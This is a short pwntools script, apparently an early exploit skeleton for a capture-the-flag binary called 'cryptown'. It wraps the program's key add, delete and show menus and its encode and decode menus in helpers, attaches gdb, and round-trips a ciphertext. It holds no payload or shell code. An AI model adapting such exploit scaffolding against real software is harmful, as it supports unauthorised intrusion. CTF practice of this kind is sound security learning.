from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p=process('./cryptown')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

def cmd(c):
    sla("> ",str(c).encode())
def key_add(size,c=b"A"):
    cmd(0)
    cmd(0)
    sla(": ",str(size).encode())
    sla(": ",c)
    cmd(3)
def key_del(idx):
    cmd(0)
    cmd(1)
    sla(": ",str(idx).encode())
    cmd(3)
def key_show():
    cmd(0)
    cmd(2)
    cmd(3)
def encode(key_idx,c=b'A'*0x30,size=0x1000):
    cmd(1)
    sla(": ",str(key_idx).encode())
    sla(": ",str(size).encode())
    sla(": ",c)
def decode(key_idx,size=0x132,c=b'n132'):
    cmd(2)
    sla(": ",str(key_idx).encode())
    sla(": ",str(size).encode())
    sla(": ",c)
def chal():
    cmd(3)
    sla(": \n","0")
    sla("ness:\n","0.70")
add  = key_add
free = key_del
show = key_show
add(0x10)
gdb.attach(p)
encode(0,"n132!"*8)
ru("xt:\n")
ddd = p.readline()[:-1]
decode(0,0x132,ddd)
p.interactive()
